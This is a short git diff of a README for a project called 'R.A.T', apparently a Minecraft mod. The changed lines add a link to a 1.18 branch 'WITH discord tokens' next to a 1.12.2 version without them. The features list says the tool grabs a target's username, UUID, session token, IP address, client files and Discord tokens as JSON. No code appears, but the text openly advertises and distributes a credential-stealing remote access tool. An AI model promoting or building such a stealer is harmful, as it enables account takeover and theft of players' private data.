@@ -15,7 +15,7 @@
 
 > Check out [DxxxxY/TokenAuth](https://github.com/DxxxxY/TokenAuth), a session id login mod.
 
-> [1.12.2](https://github.com/DxxxxY/R.A.T/tree/1.12.2) version without discord tokens.
+> [1.12.2](https://github.com/DxxxxY/R.A.T/tree/1.12.2) version WITHOUT discord tokens.<br>[1.18](https://github.com/DxxxxY/R.A.T/tree/1.18) version WITH discord tokens.
 
 ## Features
 - Grabs the **username, uuid, token, ip, feather file, essentials file and discord tokens** of a target as a *JSON*.
